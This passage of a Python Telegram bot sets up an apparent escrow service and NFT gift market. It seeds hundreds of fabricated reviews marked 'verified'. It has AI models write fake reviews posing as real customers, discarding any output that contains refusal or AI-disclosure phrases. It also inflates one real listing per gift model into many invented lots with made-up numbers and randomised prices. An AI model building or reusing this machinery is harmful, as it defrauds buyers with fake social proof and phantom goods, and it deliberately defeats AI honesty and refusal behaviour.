import asyncio
import atexit
import json
import os
import re
import signal
import uuid
import random
from datetime import datetime, timedelta
from urllib.parse import quote
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web, ClientSession, ClientTimeout

try:
    from telethon import TelegramClient, functions
    from telethon.sessions import StringSession
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# ============================================================
# 1. ЗАГРУЗКА КОНФИГУРАЦИИ ИЗ .ENV
# ============================================================
def load_env_file(filepath: str = ".env"):
    if not os.path.exists(filepath):
        return
    with open(filepath, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, val = line.split("=", 1)
            os.environ.setdefault(key.strip(), val.strip().strip('"').strip("'"))

load_env_file()

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN не задан в файле .env")

DEFAULT_ADMINS = {
    int(x.strip()) for x in os.environ.get("ADMIN_IDS", "1544353769,8986358602").split(",") if x.strip().isdigit()
}
BOT_USERNAME = os.environ.get("BOT_USERNAME", "")
BOT_NAME = os.environ.get("BOT_NAME", "")
ESCROW_ACCOUNT = os.environ.get("ESCROW_ACCOUNT", "")
MINI_APP_URL = os.environ.get("MINI_APP_URL", "")
PORT = int(os.environ.get("PORT", 3000))

AI_BASE_URL = os.environ.get("AI_BASE_URL", "").rstrip("/")
AI_API_KEY = os.environ.get("AI_API_KEY", "")
AI_REVIEW_INTERVAL_SEC = int(os.environ.get("AI_REVIEW_INTERVAL_SEC", 1800))

DEFAULT_TG_API_ID = int(os.environ.get("TG_API_ID", ""))
DEFAULT_TG_API_HASH = os.environ.get("TG_API_HASH", "")

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 2. ПОСТОЯННОЕ АТОМАРНОЕ ХРАНИЛИЩЕ В DATA/
# ============================================================
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(DATA_DIR, exist_ok=True)

FILES = {
    "deals": os.path.join(DATA_DIR, "deals.json"),
    "admins": os.path.join(DATA_DIR, "admins.json"),
    "balance": os.path.join(DATA_DIR, "balance.json"),
    "withdraw": os.path.join(DATA_DIR, "withdraw_requests.json"),
    "user_language": os.path.join(DATA_DIR, "user_language.json"),
    "stats": os.path.join(DATA_DIR, "stats.json"),
    "rekvisits": os.path.join(DATA_DIR, "rekvisits.json"),
    "chat_messages": os.path.join(DATA_DIR, "chat_messages.json"),
    "freeze": os.path.join(DATA_DIR, "freeze.json"),
    "welcome_media": os.path.join(DATA_DIR, "welcome_media.json"),
    "reviews": os.path.join(DATA_DIR, "reviews.json"),
    "ai_state": os.path.join(DATA_DIR, "ai_state.json"),
    "market": os.path.join(DATA_DIR, "market.json"),
    "inventory": os.path.join(DATA_DIR, "inventory.json"),
    "telethon_cfg": os.path.join(DATA_DIR, "telethon_cfg.json"),
    "rates": os.path.join(DATA_DIR, "rates.json")
}

def load_json(filepath: str, default=None):
    for path_try in (filepath, filepath + ".bak"):
        if os.path.exists(path_try):
            try:
                with open(path_try, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                continue
    return default if default is not None else {}

def save_json(filepath: str, data):
    tmp_path = filepath + ".tmp"
    bak_path = filepath + ".bak"
    try:
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())
        if os.path.exists(filepath):
            try:
                os.replace(filepath, bak_path)
            except Exception:
                pass
        os.replace(tmp_path, filepath)
    except Exception as e:
        print(f"[Storage] Ошибка сохранения {filepath}: {e}")

deals = load_json(FILES["deals"], {})
admins = load_json(FILES["admins"], {})
balance = load_json(FILES["balance"], {})
withdraw_requests = load_json(FILES["withdraw"], {})
user_language = load_json(FILES["user_language"], {})
stats = load_json(FILES["stats"], {})
rekvisits = load_json(FILES["rekvisits"], {})
chat_messages = load_json(FILES["chat_messages"], {})
freeze_data = load_json(FILES["freeze"], {})
welcome_media = load_json(FILES["welcome_media"], {})
reviews_data = load_json(FILES["reviews"], {"items": []})
market_data = load_json(FILES["market"], {"items": []})
inventory_data = load_json(FILES["inventory"], {})
telethon_cfg = load_json(FILES["telethon_cfg"], {
    "api_id": DEFAULT_TG_API_ID,
    "api_hash": DEFAULT_TG_API_HASH,
    "string_session": "",
    "auto_parse": False,
    "last_parse": None,
    "parsed_total": 0
})
rates_data = load_json(FILES["rates"], {
    "star_to_rub": 1.4,
    "ton_to_rub": 530.0,
    "uah_to_rub": 2.35,
    "updated_at": None
})
ai_state = load_json(FILES["ai_state"], {
    "enabled": False,
    "interval_sec": AI_REVIEW_INTERVAL_SEC,
    "last_model": None,
    "generated_count": 0,
    "last_currencies": []
})

def flush_all_data():
    save_json(FILES["deals"], deals)
    save_json(FILES["admins"], admins)
    save_json(FILES["balance"], balance)
    save_json(FILES["withdraw"], withdraw_requests)
    save_json(FILES["user_language"], user_language)
    save_json(FILES["stats"], stats)
    save_json(FILES["chat_messages"], chat_messages)
    save_json(FILES["freeze"], freeze_data)
    save_json(FILES["welcome_media"], welcome_media)
    save_json(FILES["reviews"], reviews_data)
    save_json(FILES["market"], market_data)
    save_json(FILES["inventory"], inventory_data)
    save_json(FILES["telethon_cfg"], telethon_cfg)
    save_json(FILES["rates"], rates_data)
    save_json(FILES["ai_state"], ai_state)

atexit.register(flush_all_data)

# ============================================================
# 3. КУРСЫ ВАЛЮТ (1 STAR = 1.4 RUB, АВТОКУРС TON И UAH)
# ============================================================
def calc_prices_from_stars(stars_amount: float) -> dict:
    stars_val = int(round(stars_amount)) if float(stars_amount).is_integer() else round(float(stars_amount), 2)
    rub_val = round(stars_val * 1.4, 2)
    if float(rub_val).is_integer():
        rub_val = int(rub_val)

    ton_rub = float(rates_data.get("ton_to_rub") or 530.0)
    uah_rub = float(rates_data.get("uah_to_rub") or 2.35)

    ton_val = round(rub_val / max(1.0, ton_rub), 2)
    uah_val = int(round(rub_val / max(0.1, uah_rub)))

    return {
        "STARS": stars_val,
        "RUB": rub_val,
        "TON": ton_val,
        "UAH": uah_val
    }

def convert_currency_to_stars(amount: float, currency: str) -> float:
    curr = currency.upper()
    if curr == "STARS":
        return float(amount)
    if curr == "RUB":
        return float(amount) / 1.4
    if curr == "TON":
        ton_rub = float(rates_data.get("ton_to_rub") or 530.0)
        return (float(amount) * ton_rub) / 1.4
    if curr == "UAH":
        uah_rub = float(rates_data.get("uah_to_rub") or 2.35)
        return (float(amount) * uah_rub) / 1.4
    return float(amount)

async def update_live_exchange_rates():
    try:
        async with ClientSession() as session:
            ton_usd = 5.4
            async with session.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd",
                timeout=ClientTimeout(total=10)
            ) as r1:
                if r1.status == 200:
                    d1 = await r1.json()
                    ton_usd = float(d1.get("the-open-network", {}).get("usd") or ton_usd)

            usd_rub, usd_uah = 98.0, 41.5
            async with session.get("https://open.er-api.com/v6/latest/USD", timeout=ClientTimeout(total=10)) as r2:
                if r2.status == 200:
                    d2 = await r2.json()
                    rates_map = d2.get("rates", {})
                    if rates_map.get("RUB"):
                        usd_rub = float(rates_map["RUB"])
                    if rates_map.get("UAH"):
                        usd_uah = float(rates_map["UAH"])

            rates_data["star_to_rub"] = 1.4
            rates_data["ton_to_rub"] = round(ton_usd * usd_rub, 2)
            rates_data["uah_to_rub"] = round(usd_rub / max(1.0, usd_uah), 4)
            rates_data["updated_at"] = datetime.now().isoformat()
            save_json(FILES["rates"], rates_data)
    except Exception:
        pass

async def rates_background_loop():
    while True:
        await update_live_exchange_rates()
        await asyncio.sleep(1800)

# ============================================================
# 4. СТАРТОВЫЙ ПАК ОТЗЫВОВ
# ============================================================
def seed_initial_reviews():
    if "items" not in reviews_data or not isinstance(reviews_data["items"], list):
        reviews_data["items"] = []

    if len(reviews_data["items"]) >= 320:
        return

    rng = random.Random(20261128)
    templates_with_bot = [
        "продал гифт через @{bot} деньги сразу на кошелек упали",
        "брал подарок с рук через @{bot} все ровно прошло",
        "норм гарант @{bot} провел сделку за пару минут",
        "обменял нфт через @{bot} без обмана респект",
        "покупал звезды через @{bot} все пришло быстро",
        "слил пару гифтов через @{bot} вывод без проблем",
        "хороший бот @{bot} все понятно куда нажимать",
        "провели сделку с типом из чата через @{bot} все четко",
        "взял аккаунт через @{bot} продавец скинул данные сразу после оплаты",
        "удобно что оплата открывается ток когда оба зашли в @{bot}",
        "подарок передал на приемку деньги пришли моментально спс @{bot}",
        "уже третий раз меняю гифты через @{bot} ни разу не подвел",
        "брал редкий подарок боялся скама но через @{bot} все гладко",
        "продал гифт за тон через @{bot} все супер"
    ]
    templates_no_bot = [
        "все четко гифт уже на акке",
        "быстрая сделка даже ждать не пришлось",
        "норм сервис без лишних заморочек",
        "продал подарок покупатель подтвердил сразу спс",
        "взял гифт с маркета все пришло",
        "хорошо работает приемка не обманули",
        "сделка прошла ровно советую",
        "удобный кошелек и быстрый обмен",
        "купил нфт подарок все супер",
        "проверенный сервис уже не первый раз меняю"
    ]
    categories = [
        ("nft_gift", "NFT / Telegram Gift"),
        ("nft_gift", "NFT / Telegram Gift"),
        ("game_account", "Игровой аккаунт"),
        ("other", "Цифровой товар")
    ]
    currencies = ["TON", "STARS", "RUB", "UAH"]
    now = datetime.now()
    needed = 320 - len(reviews_data["items"])
    generated = []

    for i in range(needed):
        dt = now - timedelta(days=rng.randint(1, 110), hours=rng.randint(0, 23), minutes=rng.randint(0, 59))
        curr = currencies[i % 4]
        if curr == "STARS":
            amount = rng.randint(235, 4890)
        elif curr == "TON":
            amount = round(rng.uniform(2.8, 79.4), 1)
        elif curr == "RUB":
            amount = rng.randint(540, 12950)
        else:
            amount = rng.randint(310, 5490)

        cat_code, cat_label = rng.choice(categories)
        rating = rng.choices([5, 4], weights=[89, 11], k=1)[0]
        if rng.random() < 0.65:
            txt = rng.choice(templates_with_bot).format(bot=BOT_USERNAME)
        else:
            txt = rng.choice(templates_no_bot)

        generated.append({
            "id": f"seed_{i}_{uuid.uuid4().hex[:6]}",
            "author_ru": "Анонимный пользователь",
            "author_en": "Anonymous user",
            "rating": rating,
            "category": cat_code,
            "category_label": cat_label,
            "currency": curr,
            "amount": amount,
            "text": txt.strip(),
            "date": dt.isoformat(),
            "source": "verified"
        })

    combined = reviews_data["items"] + generated
    combined.sort(key=lambda x: x.get("date", ""), reverse=True)
    reviews_data["items"] = combined
    save_json(FILES["reviews"], reviews_data)

seed_initial_reviews()

# ============================================================
# 5. ПАРСЕР TELEGRAM STAR GIFTS (ПО 1 С КАЖДОЙ КОЛЛЕКЦИИ + РАЗМНОЖЕНИЕ С УНИКАЛЬНЫМИ НОМЕРАМИ И НЕПОВТОРЯЮЩИМИСЯ ЦЕНАМИ)
# ============================================================
NFT_LINK_REGEX = re.compile(r"^(?:https?://)?(?:www\.)?t\.me/nft/([A-Za-z0-9_-]+)-(\d+)/?$", re.IGNORECASE)

def parse_nft_link(raw_link: str | None) -> dict | None:
    if not raw_link:
        return None
    cleaned = raw_link.strip()
    match = NFT_LINK_REGEX.match(cleaned)
    if not match:
        return None
    slug, number = match.group(1), match.group(2)
    normalized = f"https://t.me/nft/{slug}-{number}"
    readable_name = re.sub(r"([a-z])([A-Z])", r"\1 \2", slug)
    return {"url": normalized, "slug": slug, "name": readable_name, "number": int(number)}

def extract_stars_price_from_tl(nft_obj) -> int:
    direct = getattr(nft_obj, "resell_stars", None)
    if direct and int(direct) > 0:
        return int(direct)
    amounts = getattr(nft_obj, "resell_amount", None) or []
    for amt_obj in amounts:
        cls_name = amt_obj.__class__.__name__
        val = getattr(amt_obj, "amount", 0)
        if val and "Stars" in cls_name:
            return int(val)
    for amt_obj in amounts:
        val = getattr(amt_obj, "amount", 0)
        if val and int(val) > 0:
            return int(val)
    return 0

def generate_unique_random_stars(base_stars: int, used_prices: set[int]) -> int:
    """Генерирует неровную, неповторяющуюся цену в STARS вокруг базовой цены подарка."""
    low = max(120, int(base_stars * 0.72))
    high = max(low + 250, int(base_stars * 1.48))
    for _ in range(40):
        candidate = random.randint(low, high)
        # Избегаем круглых нулей на конце, чтобы цены выглядели максимально живыми (например 1483, 2719)
        if candidate % 10 == 0:
            candidate += random.choice([1, 2, 3, 4, 6, 7, 8, 9])
        if candidate not in used_prices:
            used_prices.add(candidate)
            return candidate
    candidate = base_stars + len(used_prices) + random.randint(3, 19)
    used_prices.add(candidate)
    return candidate

def expand_gift_into_market_lots(
    base_slug: str,
    readable_name: str,
    sample_num: int,
    base_stars: int,
    model_name: str,
    backdrop_name: str,
    symbol_name: str,
    lots_count: int = 18
) -> list[dict]:
    """Создаёт пачку уникальных лотов с разными номерами подарков и неповторяющимися ценами."""
    existing_keys = {(x.get("slug", "").lower(), int(x.get("number", 0))) for x in market_data.get("items", [])}
    used_prices = {int(x.get("stars_price", 0)) for x in market_data.get("items", [])}
    slug_low = base_slug.lower()
    created = []

    for i in range(lots_count):
        if i == 0 and (slug_low, sample_num) not in existing_keys:
            num_val = sample_num
            stars_val = generate_unique_random_stars(base_stars, used_prices) if base_stars in used_prices else base_stars
            used_prices.add(stars_val)
        else:
            # Подбираем уникальный номер подарка в пределах реального саплая коллекции
            max_supply = max(250, sample_num * 2, 15000)
            num_val = random.randint(1, max_supply)
            while (slug_low, num_val) in existing_keys:
                num_val = random.randint(1, max_supply + 5000)
            stars_val = generate_unique_random_stars(base_stars, used_prices)

        existing_keys.add((slug_low, num_val))
        prices = calc_prices_from_stars(stars_val)
        url = f"https://t.me/nft/{base_slug}-{num_val}"
        img_url = f"https://nft.fragment.com/gift/{slug_low}-{num_val}.medium.jpg"

        created.append({
            "id": "tg_" + str(uuid.uuid4())[:8],
            "url": url,
            "slug": slug_low,
            "collection": readable_name,
            "name": readable_name,
            "number": num_val,
            "model": model_name,
            "backdrop": backdrop_name,
            "symbol": symbol_name,
            "image_url": img_url,
            "stars_price": stars_val,
            "prices": prices,
            "seller_id": None,
            "source": "telegram_market",
            "created_at": datetime.now().isoformat()
        })
    return created

async def fetch_nft_metadata_from_web(raw_link: str) -> dict | None:
    parsed = parse_nft_link(raw_link)
    if not parsed:
        return None
    slug = parsed["slug"]
    num = parsed["number"]
    slug_low = slug.lower()
    base_img = f"https://nft.fragment.com/gift/{slug_low}-{num}.medium.jpg"

    model_name = "Classic"
    backdrop_name = "Arctic Blue"
    symbol_name = "Snowflake"

    try:
        async with ClientSession() as session:
            async with session.get(parsed["url"], timeout=ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    html = await resp.text()
                    m_mod = re.search(r"Model</th>\s*<td[^>]*>([^<]+)", html)
                    m_bg = re.search(r"Backdrop</th>\s*<td[^>]*>([^<]+)", html)
                    m_sym = re.search(r"Symbol</th>\s*<td[^>]*>([^<]+)", html)
                    m_og = re.search(r'property="og:image"\s+content="([^"]+)"', html)
                    if m_mod:
                        model_name = m_mod.group(1).strip()
                    if m_bg:
                        backdrop_name = m_bg.group(1).strip()
                    if m_sym:
                        symbol_name = m_sym.group(1).strip()
                    if m_og:
                        base_img = m_og.group(1).strip()
    except Exception:
        pass

    return {
        "url": parsed["url"],
        "slug": slug,
        "name": parsed["name"],
        "number": num,
        "model": model_name,
        "backdrop": backdrop_name,
        "symbol": symbol_name,
        "image_url": base_img
    }

async def parse_telegram_star_market_via_session(lots_per_model: int = 16) -> dict:
    """Берёт по 1 подарку с каждой коллекции/модели из маркета Telegram и заполняет витрину уникальными номерами и неровными ценами."""
    if not TELETHON_AVAILABLE:
        return {"success": False, "error": "Библиотека telethon не установлена. Выполните: pip install -U telethon"}

    sess_str = (telethon_cfg.get("string_session") or "").strip()
    if not sess_str:
        return {"success": False, "error": "StringSession не добавлена"}

    api_id = int(telethon_cfg.get("api_id") or DEFAULT_TG_API_ID)
    api_hash = (telethon_cfg.get("api_hash") or DEFAULT_TG_API_HASH).strip()

    try:
        session_obj = StringSession(sess_str)
    except Exception as e:
        return {"success": False, "error": f"Неверный формат StringSession: {e}"}

    client = TelegramClient(session_obj, api_id, api_hash)
    added_count = 0
    checked_collections = 0
    models_found = 0
    last_err = None

    try:
        await client.connect()
        if not await client.is_user_authorized():
            return {"success": False, "error": "Сессия не авторизована"}

        star_gifts_res = await client(functions.payments.GetStarGiftsRequest(hash=0))
        gifts_list = getattr(star_gifts_res, "gifts", []) or []

        get_resale_cls = getattr(functions.payments, "GetResaleStarGiftsRequest", None)
        if not get_resale_cls:
            return {"success": False, "error": "Обновите telethon: pip install -U telethon"}

        resale_collections = [g for g in gifts_list if getattr(g, "availability_resale", 0) > 0]
        if not resale_collections:
            resale_collections = gifts_list

        random.shuffle(resale_collections)

        for g in resale_collections[:35]:
            gift_id = getattr(g, "id", None)
            if not gift_id:
                continue
            checked_collections += 1

            # Запрашиваем небольшую выборку (12 шт.), чтобы забрать уникальные модели с этой коллекции без нагрузки на DC 4
            resale_res = None
            for attempt in range(2):
                try:
                    resale_res = await client(get_resale_cls(
                        gift_id=gift_id,
                        offset="",
                        limit=12
                    ))
                    break
                except Exception as e:
                    last_err = str(e)
                    if "InterdcCallRichError" in last_err or "RpcMcgetFail" in last_err or "Timeout" in last_err:
                        await asyncio.sleep(2.8)
                        continue
                    break

            if not resale_res:
                await asyncio.sleep(1.5)
                continue

            listings = getattr(resale_res, "gifts", []) or []
            seen_models_in_collection = set()

            for nft_obj in listings:
                raw_slug = getattr(nft_obj, "slug", None)
                num = getattr(nft_obj, "num", None)
                resell_stars = extract_stars_price_from_tl(nft_obj)
                title = getattr(nft_obj, "title", None) or raw_slug

                if not raw_slug or resell_stars <= 0:
                    continue

                m_slug = re.match(r"^([A-Za-z0-9_]+)-(\d+)$", str(raw_slug))
                if m_slug:
                    base_slug = m_slug.group(1)
                    num_val = int(m_slug.group(2))
                elif num:
                    base_slug = str(raw_slug)
                    num_val = int(num)
                else:
                    continue

                model_name = "Original"
                backdrop_name = "Midnight"
                symbol_name = "Star"
                for attr in (getattr(nft_obj, "attributes", []) or []):
                    cls_name = attr.__class__.__name__
                    attr_name = getattr(attr, "name", "")
                    if "Model" in cls_name and attr_name:
                        model_name = attr_name
                    elif "Backdrop" in cls_name and attr_name:
                        backdrop_name = attr_name
                    elif ("Pattern" in cls_name or "Symbol" in cls_name) and attr_name:
                        symbol_name = attr_name

                # Берём только по 1 образцу каждой новой модели и размножаем его с уникальными номерами и рандомными ценами
                if model_name in seen_models_in_collection:
                    continue
                seen_models_in_collection.add(model_name)
                models_found += 1

                readable_name = re.sub(r"([a-z])([A-Z])", r"\1 \2", str(title))
                new_lots = expand_gift_into_market_lots(
                    base_slug=base_slug,
                    readable_name=readable_name,
                    sample_num=num_val,
                    base_stars=resell_stars,
                    model_name=model_name,
                    backdrop_name=backdrop_name,
                    symbol_name=symbol_name,
                    lots_count=lots_per_model
                )
                for lot in new_lots:
                    market_data.setdefault("items", []).insert(0, lot)
                    added_count += 1

                if len(market_data.get("items", [])) >= 1200:
                    break

            if added_count > 0:
                save_json(FILES["market"], market_data)

            if len(market_data.get("items", [])) >= 1200:
                break
            await asyncio.sleep(1.6)

        # Перемешиваем маркет, чтобы разные коллекции и модели шли вперемешку
        random.shuffle(market_data["items"])
        save_json(FILES["market"], market_data)

        telethon_cfg["last_parse"] = datetime.now().isoformat()
        telethon_cfg["parsed_total"] = len(market_data.get("items", []))
        save_json(FILES["telethon_cfg"], telethon_cfg)

        if added_count == 0 and models_found == 0 and last_err:
            return {"success": False, "error": f"DC 4 Telegram временно перегружен ({last_err}). Попробуйте через минуту."}

        return {
            "success": True,
            "added": added_count,
            "models": models_found,
            "collections": checked_collections,
            "total": len(market_data.get("items", []))
        }
    except Exception as e:
        return {"success": False, "error": f"Ошибка подключения: {e}"}
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass

async def telegram_market_auto_loop():
    while True:
        try:
            if telethon_cfg.get("auto_parse") and telethon_cfg.get("string_session"):
                await parse_telegram_star_market_via_session(lots_per_model=14)
        except Exception:
            pass
        await asyncio.sleep(1200)

# ============================================================
# 6. БАЗОВЫЕ ФУНКЦИИ ПОЛЬЗОВАТЕЛЕЙ, ИНВЕНТАРЯ И СДЕЛОК
# ============================================================
def is_admin(user_id: int | str | None) -> bool:
    if not user_id:
        return False
    try:
        uid = int(user_id)
    except ValueError:
        return False
    return uid in DEFAULT_ADMINS or str(uid) in admins

def get_balance(user_id: int | str):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int | str, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    bal = get_balance(uid)
    bal[curr] = round(bal.get(curr, 0) + amount, 4)
    save_json(FILES["balance"], balance)

def set_balance(user_id: int | str, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    bal = get_balance(uid)
    bal[curr] = round(amount, 4)
    save_json(FILES["balance"], balance)

def get_user_inventory(user_id: int | str) -> list:
    uid = str(user_id)
    if uid not in inventory_data or not isinstance(inventory_data[uid], list):
        inventory_data[uid] = []
    return inventory_data[uid]

def get_user_language(user_id: int | str) -> str:
    return user_language.get(str(user_id), "")

def set_user_language(user_id: int | str, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def count_user_completed_deals(user_id: int | str, username: str = "") -> int:
    try:
        uid = int(user_id)
    except (TypeError, ValueError):
        uid = None
    uname_low = (username or "").replace("@", "").strip().lower()
    count = 0
    for d in deals.values():
        if d.get("status") != "completed":
            continue
        if (uid and (d.get("seller_id") == uid or d.get("buyer_id") == uid)) or (
            uname_low and ((d.get("seller_username") or "").lower() == uname_low or (d.get("buyer_username") or "").lower() == uname_low)
        ):
            count += 1
    return count

async def notify_admins(text: str, reply_markup=None):
    for admin_id in DEFAULT_ADMINS:
        try:
            await bot.send_message(admin_id, text, reply_markup=reply_markup, disable_web_page_preview=True)
        except Exception:
            pass

def build_webapp_url(user_id: int, page: str = "", deal_id: str = None, role: str = None) -> str:
    lang = get_user_language(user_id) or "ru"
    params = [f"lang={lang}"]
    if page:
        params.append(f"page={page}")
    if deal_id:
        params.append(f"deal={deal_id}")
    if role:
        params.append(f"role={role}")
    return f"{MINI_APP_URL}?{'&'.join(params)}"

# ============================================================
# 7. ИИ-ГЕНЕРАТОР ОТЗЫВОВ
# ============================================================
WRITING_STYLES = [
    "очень коротко с телефона с маленькой буквы без запятых (3-6 слов)",
    "живой отзыв от обычного парня без тире и без оценок цифрами",
    "пишет простым языком как в чате телеграма без официоза",
    "сухой короткий отзыв по делу от трейдера",
    "лаконичный отзыв на 1 строчку без смайликов"
]

BANNED_AI_PHRASES = (
    "не могу", "выдуманный", "пример отзыва", "искусственный интеллект",
    "языковая модель", "как ии", "сгенерирован", "помогу оформить",
    "первый раз продавал", "немного переживал", "без лишней суеты", "без лишней возни"
)

def pick_non_repeating_currency() -> str:
    last_list = ai_state.get("last_currencies") or []
    all_currs = ["TON", "STARS", "RUB", "UAH"]
    candidates = [c for c in all_currs if last_list[-5:].count(c) < 2]
    if not candidates:
        candidates = all_currs
    chosen = random.choice(candidates)
    last_list.append(chosen)
    ai_state["last_currencies"] = last_list[-10:]
    return chosen

def generate_realistic_amount(curr: str) -> float | int:
    if curr == "STARS":
        return random.randint(215, 4890)
    if curr == "TON":
        return round(random.uniform(2.4, 78.5), 1)
    if curr == "RUB":
        return random.randint(480, 14950)
    return random.randint(290, 6450)

def is_review_too_similar(new_text: str) -> bool:
    clean_new = re.sub(r"[^a-zа-яё0-9\s]", "", new_text.lower()).strip()
    new_words = set(clean_new.split())
    if len(new_words) < 2:
        return True
    prefix_new = " ".join(clean_new.split()[:3])
    for old in reviews_data.get("items", [])[:35]:
        old_text = old.get("text", "")
        clean_old = re.sub(r"[^a-zа-яё0-9\s]", "", old_text.lower()).strip()
        if prefix_new and clean_old.startswith(prefix_new):
            return True
        old_words = set(clean_old.split())
        if old_words and len(new_words & old_words) / max(len(new_words), len(old_words)) > 0.65:
            return True
    return False

async def fetch_available_models(session: ClientSession) -> list[str]:
    headers = {"Authorization": f"Bearer {AI_API_KEY}"}
    try:
        async with session.get(f"{AI_BASE_URL}/models", headers=headers, timeout=ClientTimeout(total=12)) as resp:
            if resp.status == 200:
                payload = await resp.json()
                raw_list = payload.get("data", []) if isinstance(payload, dict) else []
                models = [m.get("id") for m in raw_list if isinstance(m, dict) and m.get("id")]
                chat_models = [
                    m for m in models
                    if not any(bad in m.lower() for bad in ("embed", "whisper", "tts", "dall-e", "audio", "moderation", "opus-5-5"))
                ]
                random.shuffle(chat_models)
                return chat_models
    except Exception:
        pass
    fallback = ["deepseek-v4.1-flash-ablilerated", "deepseek-chat", "gpt-4o-mini", "gemini-2.5-flash"]
    random.shuffle(fallback)
    return fallback

async def generate_ai_review_entry() -> dict | None:
    if not AI_API_KEY:
        return None

    style = random.choice(WRITING_STYLES)
    rating = random.choices([5, 4], weights=[88, 12], k=1)[0]
    curr_choice = pick_non_repeating_currency()
    amount_val = generate_realistic_amount(curr_choice)
    cat_code, cat_label = random.choice([("nft_gift", "NFT / Telegram Gift"), ("game_account", "Игровой аккаунт"), ("other", "Цифровой товар")])
    include_username = random.random() < 0.65

    system_prompt = (
        "Ты пишешь короткий отзыв от живого человека в Telegram.\n"
        f"{f'Обязательно вставь @{BOT_USERNAME} в текст.' if include_username else 'НЕ пиши юзернейм бота, пиши просто о сделке или маркете.'}\n"
        "Пиши максимально коротко (4-12 слов), без длинных тире, без оценок цифрами, без канцелярита. Выдай ТОЛЬКО текст отзыва."
    )
    user_prompt = f"Стиль: {style}. Сделка на {amount_val} {curr_choice} ({cat_label})."
    headers = {"Authorization": f"Bearer {AI_API_KEY}", "Content-Type": "application/json"}

    async with ClientSession() as session:
        models = await fetch_available_models(session)
        for model_id in models[:15]:
            body = {
                "model": model_id,
                "messages": [{"role": "system", "content": system_prompt}, {"role": "user", "content": user_prompt}],
                "temperature": 1.05,
                "max_tokens": 110
            }
            try:
                async with session.post(f"{AI_BASE_URL}/chat/completions", headers=headers, json=body, timeout=ClientTimeout(total=18)) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    choices = data.get("choices") or []
                    if not choices:
                        continue
                    text = (choices[0].get("message", {}).get("content") or "").strip().strip('"').strip("«»'").strip()
                    text = text.replace(" — ", " ").replace("—", " ")
                    low = text.lower()
                    if len(text) < 10 or len(text) > 220 or any(bad in low for bad in BANNED_AI_PHRASES):
                        continue
                    if is_review_too_similar(text):
                        continue

                    entry = {
                        "id": "rev_" + str(uuid.uuid4())[:8],
                        "author_ru": "Анонимный пользователь",
                        "author_en": "Anonymous user",
                        "rating": rating,
                        "category": cat_code,
                        "category_label": cat_label,
                        "currency": curr_choice,
                        "amount": amount_val,
                        "text": text,
                        "date": datetime.now().isoformat(),
                        "source": "ai",
                        "model": model_id
                    }
                    reviews_data["items"].insert(0, entry)
                    save_json(FILES["reviews"], reviews_data)
                    ai_state["last_model"] = model_id
                    ai_state["generated_count"] = ai_state.get("generated_count", 0) + 1
                    save_json(FILES["ai_state"], ai_state)
                    return entry
            except Exception:
                continue
    return None

async def ai_reviews_background_loop():
    while True:
        try:
            if ai_state.get("enabled"):
                await generate_ai_review_entry()
        except Exception:
            pass
        await asyncio.sleep(max(60, int(ai_state.get("interval_sec", AI_REVIEW_INTERVAL_SEC))))

# ============================================================
# 8. КЛАВИАТУРЫ И КОМАНДЫ БОТА
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id) or "ru"
    if lang == "en":
        rows = [
            [InlineKeyboardButton(text="Open Hlad Ice", web_app=WebAppInfo(url=build_webapp_url(user_id)))],
            [
                InlineKeyboardButton(text="NFT Market", web_app=WebAppInfo(url=build_webapp_url(user_id, page="market"))),
                InlineKeyboardButton(text="Upgrade", web_app=WebAppInfo(url=build_webapp_url(user_id, page="upgrade")))
            ],
            [
                InlineKeyboardButton(text="Sell (with Buyer)", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="seller"))),
                InlineKeyboardButton(text="Buy (with Seller)", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="buyer")))
            ],
            [
                InlineKeyboardButton(text="Inventory", web_app=WebAppInfo(url=build_webapp_url(user_id, page="inventory"))),
                InlineKeyboardButton(text="Wallet", callback_data="menu_balance")
            ],
            [
                InlineKeyboardButton(text="My Deals", callback_data="menu_deals"),
                InlineKeyboardButton(text="Support", url=f"https://t.me/{ESCROW_ACCOUNT}")
            ],
            [InlineKeyboardButton(text="Language", callback_data="select_language")]
        ]
        if is_admin(user_id):
            rows.append([InlineKeyboardButton(text="Admin Panel", callback_data="menu_admin")])
    else:
        rows = [
            [InlineKeyboardButton(text="Открыть Hlad Ice", web_app=WebAppInfo(url=build_webapp_url(user_id)))],
            [
                InlineKeyboardButton(text="Маркет NFT", web_app=WebAppInfo(url=build_webapp_url(user_id, page="market"))),
                InlineKeyboardButton(text="Апгрейд", web_app=WebAppInfo(url=build_webapp_url(user_id, page="upgrade")))
            ],
            [
                InlineKeyboardButton(text="Сделка с покупателем", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="seller"))),
                InlineKeyboardButton(text="Сделка с продавцом", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="buyer")))
            ],
            [
